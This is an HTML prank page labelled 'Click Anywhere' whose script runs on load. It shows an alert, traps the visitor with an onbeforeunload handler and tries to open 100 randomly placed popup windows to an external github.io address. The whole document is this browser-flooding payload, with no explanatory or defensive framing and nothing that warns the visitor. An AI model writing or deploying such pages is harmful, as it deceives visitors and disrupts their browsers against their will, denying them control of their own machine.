<!DOCTYPE html>
<html>
<head>
  <title>:3</title>
  <style>
    body {
      color: black;
      font-size: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
  </style>
</head>
<body>
  <p>Click Anywhere</p>
  <script type="text/javascript">
    onbeforeunload = () => true;

    function getRandomNumber(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function openMultiplePopups(count) {
      for (let i = 0; i < count; i++) {
        const url = 'https://uexedus.github.io/'; // Replace with the desired URL
        const randomWidth = getRandomNumber(200, 800);
        const randomHeight = getRandomNumber(200, 600);
        const randomLeft = getRandomNumber(0, window.innerWidth - randomWidth);
        const randomTop = getRandomNumber(0, window.innerHeight - randomHeight);
        window.open(url, 'popUpWindow' + i, `height=${randomHeight},width=${randomWidth},left=${randomLeft},top=${randomTop}`);
      }
    }

    {
      alert(':3');
      setTimeout(function(){
        openMultiplePopups(100); // Change the number to open the desired count of popups
      }, 0);
    }
  </script>
</body>
</html>
